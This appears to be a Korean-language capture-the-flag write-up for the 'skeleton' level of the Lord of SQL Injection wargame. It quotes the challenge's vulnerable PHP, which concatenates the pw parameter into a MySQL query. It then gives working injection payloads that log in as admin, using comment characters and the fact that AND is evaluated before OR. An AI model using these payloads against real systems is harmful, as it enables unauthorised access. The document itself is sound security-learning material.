---
title: Lord of SQL Injection Write Up No.10 Skeleton
date: 2019-08-21 23:35:49
updated:
categories:
  - Write Up
tags:
  - Lord of SQL Injection
  - Infosec
---

## 개요

{% img /image/los-main.png 300 %}

SQL Injection에 대한 지식을 쌓기 위해 [Lord of SQL Injection 사이트](https://los.eagle-jump.org/)의 문제를 풀고 해답을 정리한다.

이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.

<!-- more -->

## 문제 분석

### 문제 출제 의도

SQL Injection을 통해 필요하지 않은 조건절을 무력화시킬 수 있는지 확인한다.

### 소스 코드 분석

skeleton 문제의 php 소스 코드는 다음과 같다.

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id'] == 'admin') solve("skeleton");
  highlight_file(__FILE__);
?>
```

#### Filter

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
```

- GET방식으로 `pw`를 받고, `pw`에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

#### Query

```php
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id'] == 'admin') solve("skeleton");
```

- 받은 `id`가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.
- 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 `id`에 `"admin"`이라는 값이 들어있음'이다.

## Solution

1. 주석 처리 이용

   MySQL에서는 `#`, `-- -`와 같은 주석문자에 이어져 나오는 문자열을 모두 무시한다.

   따라서 입력값으로 `' or id='admin'%23`, `' or id='admin'-- -` 과 같이 마지막에 주석을 넣은 값을 넣으면 삽입된 문자열까지만 처리하여 문제가 풀리게 된다.

   ```url
   http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=' or id='admin'%23
   ```

   URL Encoding 후 공백은 %20, #은 %23, '는 %27이 된다.

   ```url
   http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=' or id='admin'-- -
   ```

   ```sql
   select id from prob_skeleton where id='guest' and pw='' or id='admin'#' and 1=0
   ```

   ```sql
   select id from prob_skeleton where id='guest' and pw='' or id='admin'-- -' and 1=0
   ```

2. 논리 연산 우선순위 이용

   MySQL에서 WHERE절의 논리 연산같은 경우 AND연산이 OR연산보다 우선 처리된다.

   따라서 입력값으로 `' or id='admin' or '1'='1` 과 같은 값을 넣으면 `id='guest'`인 행의 `pw`가 빈 문자열이 아닌 경우 논리 연산 후 결국 `id='admin'`인 행을 불러오는 SQL문이 되어 문제가 풀리게 된다.

   ```url
   http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=' or id='admin' or '1'='1
   ```

   ```sql
   select id from prob_skeleton where id='guest' and pw='' or id='admin' or '1'='1' and 1=0
   ```
